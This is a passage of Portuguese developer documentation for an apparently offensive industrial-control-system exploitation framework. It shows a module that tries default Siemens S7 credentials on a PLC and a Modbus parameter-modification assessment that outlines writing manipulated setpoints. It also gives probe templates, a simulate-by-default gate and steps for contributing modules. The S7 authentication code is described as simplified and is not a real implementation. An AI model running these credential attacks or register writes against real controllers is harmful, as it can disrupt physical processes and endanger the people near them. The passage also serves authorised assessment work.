            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        """Testar credenciais padrão ou exibir simulação."""
        if not self.target:
            print_error("Defina a opção 'target'.")
            return

        if self.simulate:
            creds_preview = "\n    ".join(
                [f"{u}:{p}" for u, p in self.SIEMENS_DEFAULTS[:5]]
            )
            DestructiveGate.print_simulation(
                description=(
                    "Siemens S7 Default Credentials Test\n\n"
                    f"Alvo: {self.target}:{self.port}\n"
                    "Passo 1: Para cada credencial na lista:\n"
                    "         Conectar TCP, enviar COTP CR, S7comm Setup\n"
                    "         Tentar autenticação S7 com username:password\n"
                    "Passo 2: Reportar credenciais bem-sucedidas\n\n"
                    f"Primeiras 5 credenciais a testar:\n    {creds_preview}\n    ..."
                ),
                mitre_techniques=["T0812", "T0859"],
            )
            return

        print_status("Testando credenciais padrão em {}:{}...".format(self.target, self.port))
        found = []
        for username, password in self.SIEMENS_DEFAULTS:
            try:
                s = socket.socket()
                s.settimeout(5)
                s.connect((self.target, self.port))
                # COTP CR
                s.send(bytes.fromhex("0300001611e00000001400c10200c20200c0010a"))
                resp = s.recv(32)
                if resp[5] != 0xD0:
                    s.close()
                    continue
                # Tentar autenticação S7 (simplificado — implementação real é vendor-específica)
                auth_pdu = self._build_auth_pdu(username, password)
                s.send(auth_pdu)
                auth_resp = s.recv(64)
                s.close()
                if self._auth_success(auth_resp):
                    print_success("[+] Credenciais válidas encontradas: {}:{}".format(
                        username or "(vazio)", password or "(vazio)"
                    ))
                    found.append((username, password))
            except Exception:
                pass

        if not found:
            print_warning("Nenhuma credencial padrão funcionou em {}.".format(self.target))
        else:
            print_success("Total de credenciais válidas encontradas: {}".format(len(found)))

    def _build_auth_pdu(self, username: str, password: str) -> bytes:
        """Construir PDU de autenticação S7 (simplificado)."""
        # Implementação real usa protocolo S7 específico da versão
        return b"\x03\x00\x00\x18" + username.encode() + b":" + password.encode()

    def _auth_success(self, resp: bytes) -> bool:
        """Verificar se resposta indica autenticação bem-sucedida."""
        return len(resp) > 7 and resp[7] != 0xD0  # Simplificado para demonstração
```

---

## Exemplo Completo Anotado: Módulo Assessment / MITRE

```python
"""IXF Assessment T0836 Modify Parameter — Verifica proteção de modificação de parâmetro."""
from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInteger,
    mute, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "MITRE T0836: Modify Parameter Assessment",
        "description":      "Avalia proteção contra modificação de parâmetro de processo (T0836) via Modbus.",
        "authors":          ("IXF Team",),
        "references":       (
            "https://attack.mitre.org/techniques/T0836/",
            "https://www.isa.org/standards-publications/isa-standards/isa-62443",
        ),
        "devices":          ("Qualquer dispositivo Modbus TCP",),
        "impact":           "INFO",   # Assessment apenas — sem modificação real
        "exploit_type":     "MITRE ICS Assessment",
        "source_poc":       "IXF native",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "INFO",
        "mitre_techniques": ["T0836"],
        "mitre_tactics":    ["Impair Process Control"],
    }

    target   = OptIP("",   "IP do dispositivo Modbus TCP alvo")
    port     = OptPort(502, "Porta Modbus TCP")
    unit_id  = OptInteger(1, "ID de unidade Modbus")
    simulate = OptBool(True,  "Modo simulação")
    destructive = OptBool(False, "Habilitar execução ao vivo")

    @mute
    def check(self) -> bool:
        """Verificar se alvo Modbus está acessível."""
        import socket
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        """Executar assessment T0836 ou exibir descrição de técnica."""
        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "MITRE ATT&CK for ICS T0836: Modify Parameter\n\n"
                    "Técnica: Adversários modificam parâmetros operacionais (setpoints,\n"
                    "         ganhos PID, thresholds) para afetar o processo físico.\n\n"
                    f"Alvo: {self.target}:{self.port} (Unit {self.unit_id})\n\n"
                    "Passo 1: FC03 Read Holding Registers para descobrir setpoints atuais\n"
                    "Passo 2: Identificar registradores críticos (pressão, temperatura, fluxo)\n"
                    "Passo 3: FC16 Write Multiple Registers com valores manipulados\n"
                    "Passo 4: Valores alterados permanecem até o operador restaurar manualmente\n\n"
                    "Assessment: Verificar se escrita não autorizada a registradores é possível"
                ),
                mitre_techniques=["T0836"],
            )
            return

        # Assessment ao vivo — somente leitura (check se escrita seria possível)
        import socket
        import struct

        print_status("Executando assessment T0836 em {}:{}...".format(self.target, self.port))

        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))

            # FC03 Read Holding Registers (somente leitura — apenas verificando)
            mbap = struct.pack(">HHHBB HH", 1, 0, 6, self.unit_id, 3, 0, 10)
            s.send(mbap)
            resp = s.recv(64)

            if len(resp) >= 9 and resp[7] == 3:
                print_success("Leitura de holding registers bem-sucedida (FC03).")
                print_info("Holding registers 0-9 são acessíveis em leitura.")
                print_warning(
                    "[T0836] Dispositivo aceita leitura sem autenticação.\n"
                    "         Escrita também pode ser possível — teste manual necessário.\n"
                    "         Recomendação: Implementar controle de acesso por FC e source IP."
                )
            else:
                print_info("Dispositivo rejeitou leitura ou retornou exceção Modbus.")

            s.close()

        except Exception as exc:
            print_warning("Erro de conexão: {}".format(exc))

        # Exibir checklist de assessment
        print_info("\nChecklist T0836 — Modificação de Parâmetro:")
        print_info("  [ ] Escrita Modbus FC16 requer autenticação?")
        print_info("  [ ] Setpoints têm validação de intervalo no PLC?")
        print_info("  [ ] Alarmes são acionados em mudanças de setpoint?")
        print_info("  [ ] Log de auditoria registra escritas em registradores?")
        print_info("  [ ] Segmentação de rede impede acesso Modbus não autorizado?")
```

---

## Implementação de `check()` — 5 Padrões

### Padrão 1: Sonda TCP Simples

```python
@mute
def check(self) -> bool:
    """Verificar acessibilidade TCP pura."""
    if not self.target:
        return False
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((self.target, self.port))
        s.close()
        return True
    except Exception:
        return False
```

### Padrão 2: Sonda de Protocolo (com Validação de Resposta)

```python
@mute
def check(self) -> bool:
    """Verificar se alvo responde com protocolo específico."""
    if not self.target:
        return False
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((self.target, self.port))
        # Enviar requisição de sonda específica de protocolo
        s.send(b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01")  # Modbus FC03
        resp = s.recv(32)
        s.close()
        # Validar que resposta tem pelo menos 9 bytes e bit de exceção não está definido
        return len(resp) >= 9 and resp[7] < 0x80
    except Exception:
        return False
```

### Padrão 3: Sonda UDP

```python
@mute
def check(self) -> bool:
    """Verificar serviço UDP."""
    if not self.target:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(b"\x01\x00\x00\x00\x00\x00\x00\x00", (self.target, self.port))
        resp, _ = s.recvfrom(64)
        s.close()
        return len(resp) > 0
    except Exception:
        return False
```

### Padrão 4: Verificação de URL HTTP

```python
@mute
def check(self) -> bool:
    """Verificar se aplicação web alvo está acessível."""
    if not self.target:
        return False
    try:
        import urllib.request
        url = "http://{}:{}/".format(self.target, self.port)
        with urllib.request.urlopen(url, timeout=5) as resp:
            return resp.status < 500
    except Exception:
        return False
```

### Padrão 5: Verificação de Versão Específica

```python
@mute
def check(self) -> bool:
    """Verificar se versão alvo está dentro do intervalo vulnerável."""
    if not self.target:
        return False
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((self.target, self.port))
        banner = s.recv(256).decode("ascii", errors="replace")
        s.close()
        # Verificar se versão vulnerável está no banner
        return "Firmware V2." in banner or "Firmware V3." in banner
    except Exception:
        return False
```

---

## Guia de Implementação de `run()`

Todo `run()` DEVE seguir este padrão:

```python
def run(self) -> None:
    """Padrão run() completo."""
    # 1. Guard: verificar opções obrigatórias
    if not self.target:
        print_error("Defina a opção 'target' primeiro.")
        return

    # 2. Ramo simulate — SEMPRE primeiro, SEMPRE retornar após
    if self.simulate:
        DestructiveGate.print_simulation(
            description="Descrição passo a passo do ataque...",
            payload_hex="00 01 00 00 ...",      # Opcional
            payload_human="Legível por humanos", # Opcional
            mitre_techniques=["T0836"],          # Deve corresponder a __info__
        )
        return  # CRÍTICO: SEMPRE retornar aqui

    # 3. Ramo ao vivo — execute apenas se simulate=False AND destructive=True
    # O DestructiveGate no shell já verificou confirmação antes de chegar aqui
    print_status("Executando {}...".format(self.target))
    try:
        # ... lógica de exploit ao vivo ...
        print_success("Exploit bem-sucedido.")
    except ConnectionRefusedError:
        print_error("Conexão recusada.")
    except socket.timeout:
        print_error("Timeout.")
    except Exception as exc:
        print_error("Erro: {}".format(exc))
```

---

## Referência de `DestructiveGate.print_simulation()`

```python
DestructiveGate.print_simulation(
    description="...",           # str — obrigatório
    payload_hex="00 AA BB ...", # str — opcional, truncado em 120 chars
    payload_human="...",        # str — opcional
    mitre_techniques=["T0836"], # list[str] — opcional
)
```

**Regras:**
- `description`: Use `\n` para quebras de linha. Descreva cada fase e impacto físico.
- `payload_hex`: Bytes hexadecimais separados por espaço. Máx 120 chars antes da truncagem.
- `mitre_techniques`: Deve corresponder exatamente à lista `__info__["mitre_techniques"]`.

---

## Usando Decoradores `@mute` e `@multi`

### `@mute`

Suprime toda saída de `print_*` quando o método decorado é chamado internamente (ex.: por `search`, `check`).

```python
@mute
def check(self) -> bool:
    """SEMPRE decorar check() com @mute."""
    ...
```

**Por quê:** Quando o IXF indexa módulos ou exibe resultados de pesquisa, ele pode chamar `check()` em cada módulo. Sem `@mute`, cada `check()` imprimiria saída, poluindo a tela.

### `@multi`

Itera automaticamente sobre hosts quando um CIDR é fornecido como `target`. Sem `@multi`, `target` é tratado como um único IP.

```python
from industrialxpl.core.exploit import multi

@multi
def run(self) -> None:
    """@multi expande automaticamente CIDRs em 192.168.1.0/24 → 254 hosts."""
    # self.target aqui é um IP único da expansão do CIDR
    print_status("Sondando {}...".format(self.target))
```

**Exemplo com `@multi` e `@mute`:**

```python
class Exploit(Exploit):
    target   = OptCIDR("", "IP ou sub-rede CIDR alvo")
    ...

    @mute
    def check(self) -> bool:
        ...

    @multi           # @multi deve ser o decorador EXTERNO (mais próximo de 'def')
    def run(self) -> None:
        # self.target é um único IP aqui
        print_status("Sondando {}:{}...".format(self.target, self.port))
```

**Ordem dos decoradores (importante):**

```python
# CORRETO: @multi externo, @mute interno
@multi
@mute
def algum_metodo(self): ...

# TAMBÉM CORRETO para check():
@mute            # apenas @mute em check()
def check(self): ...
```

---

## Validação de Módulo e Saída Esperada

Após escrever um módulo, valide-o com:

```bash
python -m industrialxpl.tools.validate_module cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
```

**Saída esperada:**

```
[IXF Module Validator]
════════════════════════════════════════════════════════════
Módulo: cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
Arquivo: industrialxpl/modules/cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py

[Verificações de Estrutura]
  ✓ Classe chamada 'Exploit'
  ✓ Herda de Exploit (base)
  ✓ __info__ definido como dicionário de classe
  ✓ check() implementado
  ✓ run() implementado
  ✓ @mute aplicado a check()
  ✓ simulate definido como OptBool
  ✓ destructive definido como OptBool
  ✓ target definido como OptIP ou OptCIDR

[Verificações de __info__]
  ✓ name: "CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Crypto Key"
  ✓ description: presente (len=143)
  ✓ authors: ('IXF Team',)
  ✓ references: 3 URLs
  ✓ devices: 4 dispositivos
  ✓ impact: "CRITICAL" (válido)
  ✓ cve: "CVE-2021-22681" (formato válido)
  ✓ cvss: "10.0" (válido)
  ✓ mitre_techniques: ['T0843', 'T0821', 'T0866']
  ✓ mitre_tactics: ['Lateral Movement', 'Execution']

[Verificações de Opção]
  ✓ target: OptIP (obrigatório, padrão vazio)
  ✓ port: OptPort (padrão=102)
  ✓ slot: OptInteger (padrão=2)
  ✓ simulate: OptBool (padrão=True)
  ✓ destructive: OptBool (padrão=False)

[Verificação de Sintaxe]
  ✓ Análise AST bem-sucedida
  ✓ Sem imports não autorizados detectados
  ✓ Sem strings de credencial codificadas detectadas

[Teste de Simulação]
  ✓ run() em modo simulate não lança exceção
  ✓ Saída de simulação contém "SIMULATE" ou "simulate"
  ✓ print_simulation() chamado com mitre_techniques

[Resultado]
════════════════════════════════════════════════════════════
✓ MÓDULO VÁLIDO — pronto para submissão de PR
```

---

## Fluxo de Submissão de PR

1. **Fork o repositório** e crie um branch de feature:
   ```bash
   git checkout -b add-cve-2021-22681-siemens
   ```

2. **Coloque o módulo** no diretório correto conforme [Regras de Posicionamento](#regras-de-posicionamento-de-arquivo).

3. **Crie `__init__.py`** em qualquer novo diretório:
   ```bash
   touch industrialxpl/modules/cve/siemens/__init__.py
   ```

4. **Valide o módulo:**
   ```bash
   python -m industrialxpl.tools.validate_module cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
   ```

5. **Teste o modo simulate** do shell:
   ```
   ixf > use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
   ixf > set target 127.0.0.1
   ixf > run
   ```
   Confirmar que a saída de simulação é exibida sem erros.

6. **Teste `show info`:**
   ```
   ixf > show info
   ```
   Confirmar que todos os campos aparecem corretamente.

7. **Teste `check`:**
   ```
   ixf > check
   ```
   Confirmar que retorna sem imprimir output irrelevante.

8. **Commit e push:**
   ```bash
   git add industrialxpl/modules/cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py
   git add industrialxpl/modules/cve/siemens/__init__.py
   git commit -m "Add CVE-2021-22681 Siemens S7-1200 hardcoded key module"
   git push origin add-cve-2021-22681-siemens
   ```

9. **Abra um PR** no GitHub com:
   - Descrição do que o módulo faz
   - Referência ao CVE/advisory
   - Saída do validador (deve ser "MÓDULO VÁLIDO")
   - Dispositivos de teste (se disponíveis)

---

## Erros Comuns e Como Evitá-los

### Erro 1: Classe não chamada `Exploit`

```python
# ERRADO
class CVE202122681(Exploit): ...

# CORRETO
class Exploit(Exploit): ...
```

O carregador de módulos IXF procura especificamente por `Exploit`. Qualquer outro nome causa um `ImportError`.

---

### Erro 2: Opções declaradas dentro de `__init__`

```python
# ERRADO — opções dentro de __init__ não são descobertas pelo metaclass
def __init__(self):
    self.target = OptIP("", "alvo")  # NÃO FUNCIONAR

# CORRETO — opções como atributos de classe
class Exploit(Exploit):
    target = OptIP("", "alvo")      # CORRETO
```

---

### Erro 3: `run()` sem retorno após `print_simulation()`

```python
# ERRADO — código de exploit ao vivo executa mesmo em modo simulate
def run(self):
    if self.simulate:
        DestructiveGate.print_simulation(...)
        # FALTA return — código abaixo executa!
    # Código ao vivo aqui...

# CORRETO
def run(self):
    if self.simulate:
        DestructiveGate.print_simulation(...)
        return  # OBRIGATÓRIO
    # Código ao vivo aqui...
```

---

### Erro 4: `check()` sem `@mute`

```python
# ERRADO — check() sem @mute imprime saída durante search/info
def check(self):
    print_status("Verificando...")  # Imprime durante search!
    ...

# CORRETO
@mute
def check(self):
    ...  # Silencioso externamente
```

---

### Erro 5: `mitre_techniques` como string em vez de lista

```python
# ERRADO
"mitre_techniques": "T0836",  # String, não lista!

# CORRETO
"mitre_techniques": ["T0836"],  # Lista, mesmo com um item
```

---

### Erro 6: Hardcoding de credenciais reais no código

```python
# NUNCA FAZER — credenciais reais em código
API_KEY = "sk-real-api-key-here"
PASSWORD = "admin123"

# CORRETO — usar opções configuráveis
password = OptString("", "Senha para testar")
```

---

*Anterior: [Protocolos e Vendors](08-protocolos-vendors.md) | Próximo: [CLI Não-Interativo](10-cli-nao-interativo.md)*
